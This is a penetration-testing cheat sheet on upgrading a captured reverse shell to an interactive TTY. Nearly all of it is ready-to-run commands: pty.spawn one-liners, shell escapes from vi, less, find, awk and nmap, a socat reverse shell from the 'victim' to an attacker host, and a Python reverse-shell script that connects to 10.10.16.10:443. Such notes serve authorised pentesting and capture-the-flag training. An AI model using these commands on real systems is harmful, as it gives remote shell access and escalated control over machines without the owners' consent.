# Spawning shells

## Non-interactive tty-shell

If you have a non-tty-shell there are certain commands and stuff you can't do. This can happen if you upload reverse shells on a webserver, so that the shell you get is by the user www-data, or similar. These users are not meant to have shells as they don't interact with the system has humans do.

So if you don't have a tty-shell you can't run `su`, `sudo` for example. This can be annoying if you manage to get a root password but you can't use it.

Anyways, if you get one of these shells you can upgrade it to a tty-shell using the following methods:

**Using python**

```
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

**Echo**

```
echo 'os.system('/bin/bash')'
```

**sh**

```
/bin/sh -i
```

**bash**

```
/bin/bash -i
```

**Perl**

```
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
```

**Ruby**

```
ruby: exec "/bin/sh"
```

**Awk**

```
awk 'BEGIN {system("/bin/sh")}'
```

**Find**

```
find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

**More, less, or man**

Type more, less, or man command with a file then try one of the following:

```
'! /bin/sh'
'!/bin/sh'
'!bash'
```

**Lua**

```
lua: os.execute('/bin/sh')
```

**From within IRB**

```
exec "/bin/sh"
```

**From within VI**

```
:!bash
```

or

```
:set shell=/bin/bash:shell
```

or execute

```
vi ;/bin/bash
```

once exit vi \(:q!\) we would get a shell. Helpful in scenarios where the user is asked to input which file to open

**From within nmap**

```
!sh
```

## Interactive tty-shell

### **Method \#1**

# Python pty module {#method1pythonptymodule}

```
python -c 'import pty; pty.spawn("/bin/bash")' 
```



### Method \#2

# Using socat {#method2usingsocat}

So if you manage to upgrade to a non-interactive tty-shell you will still have a limited shell. You won't be able to use the up and down arrows, you won't have tab-completion. This might be really frustrating if you stay in that shell for long. It can also be more risky, if a execution gets stuck you cant use Ctr-C or Ctr-Z without killing your session. However that can be fixed using socat. Follow these instructions.

**On Kali \(listen\):**

    socat file:`tty`,raw,echo=0 tcp-listen:4444  

**On Victim \(launch\):**

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<AttackerIP>:4444
```

[https://github.com/cornerpirate/socat-shell](https://github.com/cornerpirate/socat-shell)

### Method \#3

**Using stty**

```
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

## Misc: Simple Reverse Shell

```
echo "import socket" > script.py
echo "import subprocess" >> script.py
echo "import os" >> script.py
echo "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)" >> script.py
echo 's.connect(("10.10.16.10",443))' >> script.py
echo "os.dup2(s.fileno(),0)" >> script.py
echo "os.dup2(s.fileno(),1)" >> script.py
echo "os.dup2(s.fileno(),2)" >> script.py
echo 'p=subprocess.call(["/bin/sh","-i"])' >> script.py
```

## References:

[http://unix.stackexchange.com/questions/122616/why-do-i-need-a-tty-to-run-sudo-if-i-can-sudo-without-a-password](http://unix.stackexchange.com/questions/122616/why-do-i-need-a-tty-to-run-sudo-if-i-can-sudo-without-a-password)  
[http://netsec.ws/?p=337](http://netsec.ws/?p=337)  
[http://pentestmonkey.net/blog/post-exploitation-without-a-tty](http://pentestmonkey.net/blog/post-exploitation-without-a-tty)

[https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

